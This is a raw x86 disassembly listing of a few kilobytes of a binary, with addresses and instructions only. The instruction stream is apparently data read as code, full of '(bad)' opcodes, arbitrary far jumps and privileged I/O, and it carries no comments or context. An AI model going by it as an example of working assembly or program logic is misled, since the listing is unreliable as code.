  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x27
  41e2e3:	adc    DWORD PTR [ebx],0x1446753
  41e2e9:	add    BYTE PTR [eax],al
  41e2eb:	add    DWORD PTR [eax],eax
  41e2ed:	add    BYTE PTR [eax+0x29],bh
  41e2f0:	outs   dx,BYTE PTR ds:[esi]
  41e2f1:	mov    ebp,0x83d7e0a5
  41e2f6:	jg     0x41e34d
  41e2f8:	neg    eax
  41e2fa:	dec    eax
  41e2fb:	push   ebx
  41e2fc:	scas   al,BYTE PTR es:[edi]
  41e2fd:	pop    ecx
  41e2fe:	xchg   DWORD PTR ds:0x4b8cd0e5,ebp
  41e304:	int    0x9d
  41e306:	cmp    dl,BYTE PTR [esi-0xc]
  41e309:	mov    ah,0xa7
  41e30b:	pop    ecx
  41e30c:	mov    eax,0xe00bfdad
  41e311:	inc    ebx
  41e312:	sub    BYTE PTR [esi-0x4f129062],bh
  41e318:	sub    eax,DWORD PTR [ebp-0x3ee1ae1e]
  41e31e:	inc    esi
  41e31f:	inc    ecx
  41e320:	mov    esp,0xbbf20ee7
  41e325:	cmp    BYTE PTR [ebp-0x7417eb5d],bl
  41e32b:	mov    eax,ds:0x2b9a18d8
  41e330:	jp     0x41e300
  41e332:	in     eax,dx
  41e333:	loopne 0x41e2cc
  41e335:	mov    ebx,0x5b16b5bb
  41e33a:	adc    eax,0x84a6bec9
  41e33f:	inc    eax
  41e340:	or     cl,bl
  41e342:	aas    
  41e343:	std    
  41e344:	mov    ds:0xeb4fb3fc,eax
  41e349:	mov    edx,0x68b59e77
  41e34e:	adc    cl,0x3a
  41e351:	pushaw 
  41e353:	sahf   
  41e354:	scas   eax,DWORD PTR es:[edi]
  41e355:	adc    DWORD PTR [ecx+0x5c],ebx
  41e358:	mov    ?,WORD PTR [ecx-0x752c576a]
  41e35e:	test   eax,0xedbe27e4
  41e363:	fist   DWORD PTR cs:[esi+0x3c4d69e6]
  41e36a:	(bad)  
  41e36b:	cmp    al,BYTE PTR [esp+esi*1+0x57]
  41e36f:	(bad)  
  41e371:	inc    esp
  41e372:	xlat   BYTE PTR ds:[ebx]
  41e373:	push   ds
  41e374:	mov    ch,0x7d
  41e376:	adc    al,0xcf
  41e378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e379:	mov    ecx,0x6ba1b5bb
  41e37e:	jmp    0x3151:0x5f198378
  41e385:	sbb    al,0x81
  41e387:	push   ecx
  41e388:	xchg   esi,eax
  41e389:	mov    eax,0x517e25da
  41e38e:	xchg   ecx,eax
  41e38f:	mov    ds:0xf10d7123,eax
  41e394:	sub    ecx,0x47
  41e397:	jns    0x41e370
  41e399:	xchg   esi,eax
  41e39a:	pusha  
  41e39b:	or     BYTE PTR [edx+eiz*1],ah
  41e39e:	pop    eax
  41e39f:	stos   BYTE PTR es:[edi],al
  41e3a0:	fs fs cdq 
  41e3a3:	xchg   ebx,eax
  41e3a4:	mov    dh,0xe3
  41e3a6:	mov    dh,0x9a
  41e3a8:	ins    BYTE PTR es:[edi],dx
  41e3a9:	(bad)  
  41e3ab:	aad    0xd0
  41e3ad:	dec    ebx
  41e3ae:	jl     0x41e35a
  41e3b0:	xor    al,0x83
  41e3b2:	or     BYTE PTR ds:0x782914a4,dh
  41e3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b9:	mov    ebx,0x1b2e89e9
  41e3be:	xor    eax,0x88a650d9
  41e3c3:	test   al,0x73
  41e3c5:	xor    al,0x3e
  41e3c7:	mov    edx,0xdd3fde12
  41e3cc:	xlat   BYTE PTR ds:[ebx]
  41e3cd:	jge    0x41e415
  41e3cf:	cs adc eax,0xc6dcc3e
  41e3d5:	fiadd  DWORD PTR [eax]
  41e3d7:	pop    eax
  41e3d8:	pop    ebx
  41e3d9:	jno    0x41e3ee
  41e3db:	iretw  
  41e3dd:	int3   
  41e3de:	jge    0x41e3e9
  41e3e0:	or     BYTE PTR [ebx*1-0x69e54077],0x34
  41e3e8:	ins    BYTE PTR es:[edi],dx
  41e3e9:	pop    edx
  41e3ea:	jnp    0x41e469
  41e3ec:	iret   
  41e3ed:	in     eax,0x0
	...
  41e453:	add    BYTE PTR [eax],al
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x9c03e109
  41e465:	push   esi
  41e466:	addr16 inc ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	jmp    0x41e44e
  41e470:	mov    dh,0xef
  41e472:	fldcw  WORD PTR [ebx]
  41e474:	call   FWORD PTR [ebp+0xc]
  41e477:	xor    edi,ecx
  41e479:	cmp    cl,bl
  41e47b:	and    al,0x64
  41e47d:	add    DWORD PTR ds:0xaf16f6ef,esi
  41e483:	add    DWORD PTR [esi-0x2f9faefc],eax
  41e489:	scas   al,BYTE PTR es:[edi]
  41e48a:	daa    
  41e48b:	(bad)
  41e48e:	jae    0x41e50a
  41e490:	fwait
  41e491:	test   DWORD PTR [ecx],edx
  41e493:	mov    esi,0x2f2f681d
  41e498:	je     0x41e4ab
  41e49a:	(bad)  
  41e49b:	jmp    0xefe5:0x658db6fe
  41e4a2:	mov    bh,0xa1
  41e4a4:	out    dx,al
  41e4a5:	cmp    eax,0xecd318ac
  41e4aa:	push   ds
  41e4ab:	dec    edi
  41e4ac:	std    
  41e4ad:	add    al,0xce
  41e4af:	or     eax,0x3316d7b5
  41e4b4:	mov    al,ds:0x3135e1d
  41e4b9:	fisubr DWORD PTR [ebx+0x66]
  41e4bc:	int3   
  41e4bd:	cmp    BYTE PTR [ebx-0x75af63da],al
  41e4c3:	push   esi
  41e4c4:	mov    dh,0x12
  41e4c6:	adc    al,0x8d
  41e4c8:	pop    esi
  41e4c9:	fcomp  DWORD PTR [ebx-0x4b]
  41e4cc:	mov    eax,0x4a927d73
  41e4d1:	push   0x7b59628b
  41e4d6:	adc    DWORD PTR [ecx],ecx
  41e4d8:	mov    ecx,0x72fb1a1a
  41e4dd:	das    
  41e4de:	dec    ebx
  41e4df:	mov    eax,ds:0xb983b9ca
  41e4e4:	push   ebx
  41e4e5:	cmc    
  41e4e6:	lds    ebx,FWORD PTR [ebp+0x40cacb37]
  41e4ec:	mov    bl,0xcb
  41e4ee:	and    bl,bl
  41e4f0:	iret   
  41e4f1:	ror    DWORD PTR [esp+esi*4-0x4],cl
  41e4f5:	lahf   
  41e4f6:	jnp    0x41e54c
  41e4f8:	ret    0x13fc
  41e4fb:	ss (bad) 
  41e4fd:	adc    dh,dl
  41e4ff:	dec    ecx
  41e500:	iret   
  41e501:	dec    ebp
  41e502:	and    ecx,0x2e1cbda3
  41e508:	sbb    BYTE PTR [ebx+0xd],dl
  41e50b:	popf   
  41e50c:	outs   dx,BYTE PTR ds:[esi]
  41e50d:	je     0x41e512
  41e50f:	retf   0x756
  41e512:	loop   0x41e56d
  41e514:	pop    esp
  41e515:	push   ebx
  41e516:	es jge 0x41e536
  41e519:	outs   dx,BYTE PTR ds:[esi]
  41e51a:	jno    0x41e54d
  41e51c:	inc    esi
  41e51d:	pushf  
  41e51e:	pop    eax
  41e51f:	ins    DWORD PTR es:[edi],dx
  41e520:	clc    
  41e521:	cmp    BYTE PTR [ecx+0x3c211dfa],bh
  41e527:	in     eax,0x77
  41e529:	retf   
  41e52a:	or     al,0xe6
  41e52c:	int3   
  41e52d:	jns    0x41e575
  41e52f:	fnstcw WORD PTR [edx]
  41e531:	(bad)  
  41e532:	test   eax,0xb67a46d7
  41e537:	call   0x5289:0xaae9eca8
  41e53e:	nop
  41e53f:	stos   BYTE PTR es:[edi],al
  41e540:	std    
  41e541:	rcl    BYTE PTR [edi-0x445df1f3],1
  41e547:	ret    0xfb70
  41e54a:	int    0x51
  41e54c:	dec    ebx
  41e54d:	pop    ss
  41e54e:	mov    ch,0x72
  41e550:	fwait
  41e551:	xor    dh,BYTE PTR [edi-0x36a4b035]
  41e557:	mov    al,0x23
  41e559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e55a:	adc    DWORD PTR [esi],ebx
  41e55c:	scas   eax,DWORD PTR es:[edi]
  41e55d:	dec    ebp
  41e55e:	out    dx,al
  41e55f:	jmp    FWORD PTR [edi+0x7727d029]
  41e565:	sbb    esp,edi
  41e567:	pop    edx
  41e568:	sti    
  41e569:	ss mov dh,0x82
  41e56c:	test   BYTE PTR [esi+0x0],bh
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e567
  41e5e3:	xor    DWORD PTR [ebp-0x71],ebx
  41e5e6:	addr16 inc esi
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	jmp    0xbc28fe20
  41e5f3:	xchg   ecx,eax
  41e5f4:	add    eax,DWORD PTR [ecx-0x26817255]
  41e5fa:	xor    DWORD PTR [edx-0x73],0x33
  41e5fe:	rcl    DWORD PTR [esp+eiz*8],0x48
  41e602:	xchg   esi,eax
  41e603:	xchg   ecx,eax
  41e604:	sbb    ebp,esp
  41e606:	xor    al,0xb4
  41e608:	or     DWORD PTR [ecx],ebx
  41e60a:	es and al,0xf5
  41e60d:	jmp    0x2073f9c6
  41e612:	cmc    
  41e613:	(bad)  
  41e614:	jns    0x41e663
  41e616:	jle    0x41e5af
  41e618:	pop    ds
  41e619:	(bad)  
  41e61a:	mov    ecx,0xdbad61a0
  41e61f:	and    DWORD PTR [esi+eiz*2-0x47],esi
  41e623:	mov    WORD PTR [ecx+0x6d],fs
  41e626:	dec    eax
  41e627:	cli    
  41e628:	rcl    BYTE PTR fs:[ecx+0x1cf506da],cl
  41e62f:	dec    ecx
  41e630:	xchg   ecx,eax
  41e631:	(bad)  [esi-0x59]
  41e634:	(bad)  
  41e636:	mov    esp,0x7f68617f
  41e63b:	push   ebx
  41e63c:	sbb    eax,0x9497f01a
  41e641:	out    0x15,al
  41e643:	bound  ecx,QWORD PTR [edi]
  41e645:	mov    ds:0x89d6678b,al
  41e64a:	and    ecx,DWORD PTR [ecx]
  41e64c:	into   
  41e64d:	jns    0x41e60a
  41e64f:	dec    esi
  41e650:	or     DWORD PTR [ebp-0x74b44f26],ecx
  41e656:	into   
  41e657:	dec    ebx
  41e658:	cmp    BYTE PTR [ebx+esi*8+0x7c],ch
  41e65c:	pop    ebp
  41e65d:	cmp    DWORD PTR [eax+ebx*4+0x4ebb3f32],esp
  41e664:	in     eax,0x16
  41e666:	popa   
  41e667:	nop
  41e668:	fdiv   QWORD PTR [edi-0x2a]
  41e66b:	push   esi
  41e66c:	pushf  
  41e66d:	and    DWORD PTR [edi+edi*1-0x20],0x0
  41e672:	js     0x41e646
  41e674:	pop    esp
  41e675:	je     0x41e675
  41e677:	fdivr  DWORD PTR [edi]
  41e679:	ds call 0x35c2:0x6fad7ff2
  41e681:	cwde   
  41e682:	and    esp,DWORD PTR [edx]
  41e684:	pop    ds
  41e685:	fist   WORD PTR [ebp+0x4a]
  41e688:	es jns 0x41e6f3
  41e68b:	out    0x5f,al
  41e68d:	fxch   st(0)
  41e68f:	jmp    0x41e6f2
  41e691:	and    esi,DWORD PTR [edx]
  41e693:	push   esi
  41e694:	jle    0x41e64e
  41e696:	mov    edx,0x53f4d37a
  41e69b:	out    dx,eax
  41e69c:	dec    esp
  41e69d:	mov    dh,0x98
  41e69f:	xor    eax,0x5622ff5a
  41e6a4:	outs   dx,BYTE PTR ds:[esi]
  41e6a5:	dec    ecx
  41e6a7:	call   0xbcb6:0x897fff59
  41e6ae:	mov    bh,BYTE PTR [edi-0x8]
  41e6b1:	cmp    DWORD PTR [edi+0x8],esi
  41e6b4:	xor    dh,0x0
  41e6b7:	(bad)  
  41e6b8:	push   ebp
  41e6b9:	int    0xfb
  41e6bb:	adc    al,0xff
  41e6bd:	xlat   BYTE PTR ds:[ebx]
  41e6be:	pop    es
  41e6bf:	(bad)  
  41e6c0:	xchg   ebx,eax
  41e6c1:	(bad)
  41e6c4:	(bad)  
  41e6c6:	test   al,0x31
  41e6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6c9:	dec    esi
  41e6ca:	or     DWORD PTR [edi-0x69b8e0a9],esp
  41e6d0:	sub    BYTE PTR [eax-0x45],0x55
  41e6d4:	or     BYTE PTR ss:[esi],cl
  41e6d7:	je     0x41e685
  41e6d9:	xor    ch,BYTE PTR [eax+0x68]
  41e6dc:	shl    BYTE PTR [ecx],0x96
  41e6df:	push   ebx
  41e6e0:	adc    eax,0xc530c5f2
  41e6e5:	jae    0x41e69f
  41e6e7:	mov    esp,0x6210779f
  41e6ec:	inc    ecx
  41e6ed:	add    BYTE PTR gs:[eax],al
	...
  41e754:	add    BYTE PTR [eax],al
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    esi,edi
  41e763:	xchg   BYTE PTR [esi+0x39],dh
  41e766:	addr16 inc edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	adc    cl,BYTE PTR ds:0xe5221801
  41e774:	xor    DWORD PTR [eax-0x5b],edi
  41e777:	xor    al,0x5d
  41e779:	push   edx
  41e77a:	(bad)  
  41e77b:	or     BYTE PTR [esi+0x79],al
  41e77e:	mov    edx,0xeac276e8
  41e783:	mov    al,ds:0x4afa6ea0
  41e788:	add    edi,ebx
  41e78a:	mov    WORD PTR [ebx-0xadf79de],?
  41e790:	into   
  41e791:	or     edx,DWORD PTR [eax+edi*8]
  41e794:	loopne 0x41e7b3
  41e796:	pop    edx
  41e797:	ja     0x41e757
  41e799:	mov    edi,0x4820d4ec
  41e79e:	push   ds
  41e79f:	cmp    BYTE PTR [esi+ecx*2+0x74],bh
  41e7a3:	jmp    0xdec42b38
  41e7a8:	aas    
  41e7a9:	dec    ebx
  41e7aa:	scas   eax,DWORD PTR es:[edi]
  41e7ab:	into   
  41e7ac:	cmp    ecx,ebp
  41e7ae:	jnp    0x41e7c5
  41e7b0:	mov    al,0xf6
  41e7b2:	jb     0x41e743
  41e7b4:	aam    0x20
  41e7b6:	pop    es
  41e7b7:	dec    ecx
  41e7b8:	jg     0x41e785
  41e7ba:	mov    edi,0xff8bf92b
  41e7bf:	cs push esp
  41e7c1:	mov    edi,0xa99cdc45
  41e7c6:	fist   DWORD PTR [ebx]
  41e7c8:	aas    
  41e7c9:	call   0x6efafd0d
  41e7ce:	mov    eax,0xaba07f1f
  41e7d3:	xchg   ecx,eax
  41e7d4:	inc    edi
  41e7d5:	cmp    dh,BYTE PTR [ebx+0x2c3ec112]
  41e7db:	dec    esp
  41e7dc:	neg    BYTE PTR [ecx]
  41e7de:	dec    ebp
  41e7df:	stc    
  41e7e0:	les    ebp,FWORD PTR [edi]
  41e7e2:	push   eax
  41e7e3:	mov    cs,WORD PTR [edx+0x14316a69]
  41e7e9:	ja     0x41e81c
  41e7eb:	xchg   ebp,eax
  41e7ec:	sbb    BYTE PTR [ecx-0x3e38cc09],bl
  41e7f2:	sub    ebx,edi
  41e7f4:	inc    ebx
  41e7f5:	nop
  41e7f6:	sbb    ebx,DWORD PTR [edi]
  41e7f8:	sub    ch,ch
  41e7fa:	in     al,dx
  41e7fb:	or     cl,BYTE PTR [ecx-0x1d66f3bd]
  41e801:	mov    edi,DWORD PTR [esp+ecx*1+0x7b4c8a3]
  41e808:	jne    0x41e7f3
  41e80a:	inc    esi
  41e80b:	mov    ch,0x73
  41e80d:	sub    DWORD PTR [eax+ebx*4],esp
  41e810:	daa    
  41e811:	out    dx,eax
  41e812:	push   0xffffffd1
  41e814:	mov    edi,0x70462ad5
  41e819:	mov    bh,0xa
  41e81b:	push   esi
  41e81c:	mov    fs,WORD PTR [ebp-0x47]
  41e81f:	sbb    DWORD PTR [eax-0x6e],ecx
  41e822:	jmp    0x41e83e
  41e824:	inc    BYTE PTR [ebp-0x6b]
  41e827:	cmp    eax,0xfef1a856
  41e82c:	jg     0x41e83d
  41e82e:	cmp    dl,BYTE PTR [eax+0xe25cd84]
  41e834:	aas    
  41e835:	jns    0x41e836
  41e837:	in     eax,0xff
  41e839:	iret   
  41e83a:	fild   WORD PTR [ecx]
  41e83c:	push   ebp
  41e83d:	fldln2 
  41e83f:	in     al,0xd4
  41e841:	dec    ebx
  41e842:	pushf  
  41e843:	jg     0x41e7df
  41e845:	ja     0x41e894
  41e847:	push   edi
  41e848:	imul   ecx,DWORD PTR ds:0xf33b16a7,0xffffffce
  41e84f:	mov    dh,0x84
  41e851:	fisttp QWORD PTR [ebx-0x9]
  41e854:	ins    DWORD PTR es:[edi],dx
  41e855:	jg     0x41e894
  41e857:	shr    DWORD PTR [ebx+ebx*2],cl
  41e85a:	repz sub DWORD PTR [esi],esp
  41e85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e85e:	mov    eax,ds:0xc9885f57
  41e863:	jle    0x41e857
  41e865:	xor    bh,0xfe
  41e868:	ins    DWORD PTR es:[edi],dx
  41e869:	popa   
  41e86a:	adc    edi,DWORD PTR [esi-0x70]
  41e86d:	retf   0x0
	...
  41e8d4:	add    BYTE PTR [eax],al
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e864
  41e8e3:	lock jmp 0x18a50e1
  41e8e9:	add    BYTE PTR [eax],al
  41e8eb:	add    DWORD PTR [eax],eax
  41e8ed:	add    BYTE PTR [edx],bh
  41e8ef:	add    ch,BYTE PTR [ecx]
  41e8f1:	shr    BYTE PTR [edx+0x39698d4e],1
  41e8f7:	push   eax
  41e8f8:	xchg   DWORD PTR [ebx],ebp
  41e8fa:	push   ecx
  41e8fb:	mov    ds:0x20fb39bf,al
  41e900:	xchg   esp,eax
  41e901:	es pop ebx
  41e903:	mov    DWORD PTR [eax+0x5c],ecx
  41e906:	adc    ah,BYTE PTR [esi-0x49]
  41e909:	es sbb eax,0xb7e984e1
  41e90f:	xor    edi,DWORD PTR [edi-0x3c]
  41e912:	fs pop ecx
  41e914:	push   DWORD PTR [ecx-0x58]
  41e917:	inc    esi
  41e918:	inc    ebx
  41e919:	adc    al,0x9c
  41e91b:	inc    esi
  41e91c:	fild   DWORD PTR [edi+ebx*8]
  41e91f:	test   ebp,esp
  41e921:	or     eax,0xfbeb4c0
  41e926:	jae    0x41e962
  41e928:	and    BYTE PTR [edi+0x5bdb1787],bh
  41e92e:	dec    ebx
  41e92f:	pushf  
  41e930:	mov    edi,edx
  41e932:	popf   
  41e933:	into   
  41e934:	mov    ebp,0xde19991f
  41e939:	out    dx,al
  41e93a:	lea    ebp,[ecx+0x5b]
  41e93d:	xor    eax,0xeb0fcee8
  41e942:	sub    edx,DWORD PTR ds:0xf868e306
  41e948:	dec    eax
  41e949:	sub    dl,ch
  41e94b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e94c:	inc    edi
  41e94d:	ror    esi,0x11
  41e950:	push   ds
  41e951:	push   ds
  41e952:	push   0x27
  41e954:	or     al,0x60
  41e956:	jmp    0xbf46c4b9
  41e95b:	sbb    BYTE PTR [ebp+0x1388500b],dh
  41e961:	pop    edi
  41e962:	cmp    DWORD PTR [eax-0x2d],esi
  41e965:	shl    BYTE PTR [ebx+0x6c],cl
  41e968:	fwait
  41e969:	jl     0x41e9b6
  41e96b:	mov    esi,0x701d3e77
  41e970:	test   eax,0xa96cb851
  41e975:	push   ax
  41e977:	push   es
  41e978:	sbb    ah,BYTE PTR [edi]
  41e97a:	dec    ebx
  41e97b:	push   ebx
  41e97c:	(bad)  
  41e97d:	xchg   esp,eax
  41e97e:	bound  edx,QWORD PTR [eax]
  41e980:	ds xchg ebp,eax
  41e982:	iret   
  41e983:	std    
  41e984:	pop    edi
  41e985:	cmp    BYTE PTR [ebp+eiz*2-0x1f],cl
  41e989:	test   eax,0xd98411b1
  41e98e:	loop   0x41e9f1
  41e990:	push   ecx
  41e991:	icebp  
  41e992:	jnp    0x41e95b
  41e994:	sbb    BYTE PTR [esi],cl
  41e996:	xchg   ebx,eax
  41e997:	retf   
  41e998:	xor    al,0x57
  41e99b:	and    bh,BYTE PTR [esp+eax*4-0x6f]
  41e99f:	lea    esp,[edx+0x3dc4b431]
  41e9a5:	fistp  QWORD PTR [eax+0x69]
  41e9a8:	push   ss
  41e9a9:	mov    al,ds:0xb19c8d0b
  41e9ae:	adc    BYTE PTR [edx+0x22],al
  41e9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b2:	jg     0x41e938
  41e9b4:	lahf   
  41e9b5:	push   ebx
  41e9b6:	ss pop es
  41e9b8:	cmp    ecx,DWORD PTR [esi+ebx*1+0x7]
  41e9bc:	add    bh,BYTE PTR [ecx-0x59f7dcb5]
  41e9c2:	push   esi
  41e9c3:	push   edx
  41e9c4:	push   ebx
  41e9c5:	imul   esp,DWORD PTR [ebp+0x3],0x62
  41e9c9:	sub    eax,0x23d58cf4
  41e9ce:	mov    ebx,0xf5e8f1c1
  41e9d3:	(bad)  
  41e9d4:	jecxz  0x41e97c
  41e9d6:	jge    0x41e9f2
  41e9d8:	jb     0x41ea27
  41e9da:	scas   al,BYTE PTR es:[edi]
  41e9db:	sbb    eax,esp
  41e9dd:	mov    cs,WORD PTR [eax]
  41e9df:	fisubr WORD PTR [eax-0x5ac89379]
  41e9e5:	mov    eax,ds:0x66463087
  41e9ea:	jecxz  0x41ea15
  41e9ec:	mov    bh,BYTE PTR [ebx+0x0]
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	jp     0x41ea6f
  41ea64:	clc    
  41ea65:	mov    WORD PTR [edi+0x49],fs
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	jmp    0x41ea4c
  41ea70:	mov    fs,esi
  41ea72:	imul   esi,esi,0x737dfd13
  41ea78:	and    eax,0x894f414f
  41ea7d:	add    DWORD PTR [esi+0xe1b8514],esi
  41ea83:	mov    eax,ds:0x8f213220
  41ea88:	add    eax,0x66c8a8dd
  41ea8d:	cmc    
  41ea8e:	out    0x7e,al
  41ea90:	inc    eax
  41ea91:	cmp    BYTE PTR [ecx+0x33a89b56],al
  41ea97:	mov    bl,0x7a
  41ea99:	add    BYTE PTR [esi-0x54b7d392],bh
  41ea9f:	fadd   DWORD PTR [esi-0x69]
  41eaa2:	sti    
  41eaa3:	fidiv  DWORD PTR [ebx-0x28]
  41eaa6:	or     al,0x5e
  41eaa8:	ret    0xa03c
  41eaab:	add    al,0x54
  41eaad:	in     eax,0xc0
  41eaaf:	adc    al,0x7f
  41eab1:	add    al,0x87
  41eab3:	jae    0x41eacf
  41eab5:	retf   0xa0e
  41eab8:	cs dec ebp
  41eaba:	popf   
  41eabb:	outs   dx,BYTE PTR ds:[esi]
  41eabc:	(bad)  
  41eabd:	in     eax,0xa9
  41eabf:	hlt    
  41eac0:	pop    ss
  41eac1:	fadd   st,st(2)
  41eac3:	repz dec ecx
  41eac5:	jecxz  0x41ea93
  41eac7:	jle    0x41ea56
  41eac9:	ins    DWORD PTR es:[edi],dx
  41eaca:	repnz test DWORD PTR [ebp-0x69],0xe6ba46e
  41ead2:	cmc    
  41ead3:	dec    eax
  41ead4:	dec    edx
  41ead5:	aad    0x37
  41ead7:	inc    edx
  41ead8:	xchg   ecx,eax
  41ead9:	inc    ebx
  41eada:	sub    eax,0xa0548d3
  41eadf:	jg     0x41eab8
  41eae1:	jo     0x41ea76
  41eae3:	mov    ah,0x50
  41eae5:	addr16 xchg esp,eax
  41eae7:	mov    esp,0xb3048960
  41eaec:	out    0x50,al
  41eaee:	js     0x41eaed
  41eaf0:	inc    eax
  41eaf1:	cdq    
  41eaf2:	inc    esi
  41eaf3:	leave  
  41eaf4:	pop    ebp
  41eaf5:	add    DWORD PTR [ecx],esp
  41eaf7:	pop    ebx
  41eaf8:	add    DWORD PTR [eax-0x74],ebp
  41eafb:	fbld   TBYTE PTR [edi-0x30]
  41eafe:	addr16 push edi
  41eb00:	push   ebp
  41eb01:	adc    edx,edi
  41eb03:	stc    
  41eb04:	add    DWORD PTR [ebp+0x313fa870],edi
  41eb0a:	mov    esp,0xb9faabea
  41eb0f:	aas    
  41eb10:	add    DWORD PTR [edx+0x30],esi
  41eb13:	inc    eax
  41eb14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb15:	into   
  41eb16:	mov    ds:0x56876066,eax
  41eb1b:	cmp    BYTE PTR [eax+0x36],dl
  41eb1e:	jmp    0x41eaf3
  41eb20:	outs   dx,BYTE PTR ds:[esi]
  41eb21:	mov    cl,0xaa
  41eb23:	or     BYTE PTR [ecx-0x38],cl
  41eb26:	push   ds
  41eb27:	int3   
  41eb28:	mov    bh,0x12
  41eb2a:	clc    
  41eb2b:	push   edx
  41eb2c:	arpl   WORD PTR [edx-0x6],ax
  41eb2f:	loope  0x41eaca
  41eb31:	daa    
  41eb32:	es popf 
  41eb34:	jmp    0x41eaca
  41eb36:	clc    
  41eb37:	aad    0x31
  41eb39:	nop
  41eb3a:	mov    ds:0x33177d4e,al
  41eb3f:	out    0xe6,al
  41eb41:	xchg   esp,eax
  41eb42:	popa   
  41eb43:	cld    
  41eb44:	jo     0x41eb71
  41eb46:	or     al,0x36
  41eb48:	dec    edi
  41eb49:	fcom   QWORD PTR [ecx]
  41eb4b:	jbe    0x41eae5
  41eb4d:	mov    edx,0x2271b56b
  41eb52:	jb     0x41ebb7
  41eb54:	pusha  
  41eb55:	sub    eax,0x31733353
  41eb5a:	dec    ecx
  41eb5b:	cmp    BYTE PTR [ecx-0x3b],ch
  41eb5e:	pop    ecx
  41eb5f:	cld    
  41eb60:	setae  BYTE PTR [ebp-0x3f]
  41eb64:	mov    bl,0x15
  41eb66:	sbb    al,cl
  41eb68:	sbb    ecx,esp
  41eb6a:	stc    
  41eb6b:	and    eax,0x5241
	...
  41ebd4:	add    BYTE PTR [eax],al
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x32
  41ebe3:	add    BYTE PTR [edx],ah
  41ebe5:	pop    esp
  41ebe6:	addr16 dec edx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	ins    BYTE PTR es:[edi],dx
  41ebef:	nop
  41ebf0:	das    
  41ebf1:	push   ebx
  41ebf2:	jl     0x41ec24
  41ebf4:	mov    ch,BYTE PTR [edx+0x455444bf]
  41ebfa:	xlat   BYTE PTR ds:[ebx]
  41ebfb:	jb     0x41ec3c
  41ebfd:	dec    edx
  41ebfe:	inc    edx
  41ebff:	cmp    eax,0xc0f92af0
  41ec04:	and    DWORD PTR [esi],ecx
  41ec06:	add    DWORD PTR [eax-0x4c],eax
  41ec09:	jp     0x41ec28
  41ec0b:	cmp    al,0x3d
  41ec0d:	add    al,0xf5
  41ec0f:	jmp    0x7c4e:0x1b6718f4
  41ec16:	leave  
  41ec17:	test   eax,0xf880f881
  41ec1c:	pop    edi
  41ec1d:	aad    0x86
  41ec1f:	mov    eax,ds:0xb6d98fd3
  41ec24:	ins    DWORD PTR es:[edi],dx
  41ec25:	imul   esp,DWORD PTR [eax-0x15],0x41883fcf
  41ec2c:	push   0x40
  41ec2e:	or     al,0x25
  41ec30:	or     DWORD PTR [edi+0x7378d74],0xffffffd4
  41ec37:	pop    ebx
  41ec38:	dec    esp
  41ec39:	mov    BYTE PTR [ecx+0x34],al
  41ec3c:	pop    ss
  41ec3d:	int3   
  41ec3e:	clc    
  41ec3f:	scas   eax,DWORD PTR es:[edi]
  41ec40:	xor    eax,0x5182e610
  41ec45:	push   cs
  41ec46:	fdiv   QWORD PTR [edx+eiz*4+0x2a]
  41ec4a:	xchg   esp,eax
  41ec4b:	jle    0x41ec1d
  41ec4d:	or     BYTE PTR [ecx-0x3d8b55bd],al
  41ec53:	fnstenv [edx]
  41ec55:	inc    edi
  41ec56:	xor    eax,0xa33972d0
  41ec5b:	xchg   ebp,eax
  41ec5c:	mov    cl,0x9c
  41ec5e:	inc    ecx
  41ec5f:	inc    ebx
  41ec60:	jle    0x41ecb8
  41ec62:	xor    BYTE PTR [eax+0xb0d5948],ah
  41ec68:	into   
  41ec69:	shl    ch,1
  41ec6b:	add    bh,BYTE PTR [eax+ebx*8-0x162f43f2]
  41ec72:	mov    ds:0x1096860c,al
  41ec77:	mov    ah,BYTE PTR [edi-0x1]
  41ec7a:	add    DWORD PTR [eax-0xccf09bd],ecx
  41ec80:	mov    bl,0xbd
  41ec82:	loopne 0x41ec0d
  41ec84:	test   eax,0xfceffda9
  41ec89:	out    dx,eax
  41ec8a:	cs std 
  41ec8c:	sub    ecx,DWORD PTR [ecx+0x1c]
